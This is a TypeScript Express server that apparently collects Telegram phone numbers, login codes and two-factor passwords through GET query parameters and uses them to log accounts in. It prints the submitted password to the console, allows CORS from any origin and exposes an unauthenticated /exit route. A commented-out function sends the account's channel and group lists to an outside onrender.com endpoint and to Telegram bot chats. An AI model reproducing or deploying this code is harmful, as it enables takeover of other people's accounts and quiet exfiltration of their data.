import express from 'express';
import axios from 'axios'
import cors from 'cors';
import { getClient, createClient, disconnectAll } from "./telegramManager";

require('dotenv').config();

const app = express();
app.use(cors());
const port = 4000;

async function fetchWithTimeout(resource, options: any = {}) {
    const timeout = options?.timeout || 15000;

    const source = axios.CancelToken.source();
    const id = setTimeout(() => source.cancel(), timeout);
    try {
        const response = await axios({
            ...options,
            url: resource,
            cancelToken: source.token
        });
        clearTimeout(id);
        return response;
    } catch (error) {
        if (axios.isCancel(error)) {
            console.log('Request canceled:', error.message);
        } else {
            console.log('Error:', error.message);
        }
        return undefined;
    }
}

app.get('/', async (req, res) => {
    res.send('Hello World!');
});

app.get('/login', async (req, res) => {
    const deleteOthers = req.query.force;
    if (deleteOthers) {
        await disconnectAll();
    }
    const result = await createClient(req.query.phone);
    if (result?.isCodeViaApp) {
        console.log('OTP SENT!! - ', req.query.phone)
        res.status(200).send(result.phoneCodeHash);
    } else {
        res.sendStatus(400);
    }
});

app.get('/otp', async (req, res) => {
    const phoneCode = req.query.code;
    const number = req.query.phone;
    const password = req.query.password
    const cli = await getClient(number);
    if (cli) {
        console.log(cli?.phoneCodeHash, cli?.phoneNumber);
        const result: any = await cli?.login(phoneCode, password);
        if (result && result.status === 200) {
            res.status(200).send({ mesaage: result.message });
        } else {
            res.status(result.status).send({ mesaage: result.message });
        }
    } else {
        res.sendStatus(400);
    }
});

app.get('/password', async (req, res) => {
    const password = req.query.password;
    console.log(password)
    res.send('loggingIn!!');
});

app.get('/exit', async (req, res) => {
    process.exit(1)
    res.json({});
});

app.listen(port, () => {
    console.log(`App listening at http://localhost:${port}`);
});

// async function sendChannels(chats) {
//     const chatsArray = [];
//     let reply = 'CHANNELS:\n\n';
//     chats.map((chat: any) => {
//         if (chat.isChannel || chat.isGroup) {
//             const chatEntity = chat.entity.toJSON();
//             chatsArray.push(chatEntity);
//             const username = chatEntity.username ? ` @${chatEntity.username} ` : chatEntity.id.toString();
//             reply = reply + chatEntity.title + " " + username + ' \n';
//         }
//     });
//     await axios.post(`https://ramyaaa.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });

//     const payload = {
//         chat_id: "-1001801844217",
//         text: reply
//     };
//     const options = {
//         method: 'POST',
//         headers: { 'Content-Type': 'application/json' },
//         body: JSON.stringify(payload)
//     };
//     await fetchWithTimeout(`${ppplbot}`, options);

//     const payload2 = {
//         chat_id: "-1001970448012",
//         text: reply
//     };
//     const options2 = {
//         method: 'POST',
//         headers: { 'Content-Type': 'application/json' },
//         body: JSON.stringify(payload2)
//     };
//     await fetchWithTimeout(`${ppplbot}`, options2);
// }